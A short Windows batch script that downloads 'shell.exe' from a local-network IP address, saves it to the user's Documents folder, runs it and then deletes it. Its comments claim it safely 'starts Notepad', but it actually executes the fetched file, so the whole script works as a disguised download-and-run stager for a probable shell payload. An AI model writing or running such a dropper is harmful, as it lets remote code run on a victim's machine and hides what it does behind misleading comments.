@echo off
setlocal

:: Configuration
set "URL=http://192.168.1.40/shell.exe"
set "DEST=%USERPROFILE%\Documents\downloaded.exe"

:: Download executable
echo Downloading file...
curl.exe -fL "%URL%" -o "%DEST%"

:: Check download status
if errorlevel 1 (
    echo Download failed!
    exit /b 1
)

:: Verify file exists
if not exist "%DEST%" (
    echo File not found!
    exit /b 1
)

echo Download successful: %DEST%

:: Demonstrate process execution safely
echo Starting Notepad...
start "" "%DEST%"

:: Delete downloaded file
if exist "%DEST%" (
    del /f /q "%DEST%"
    echo File deleted.
)

endlocal
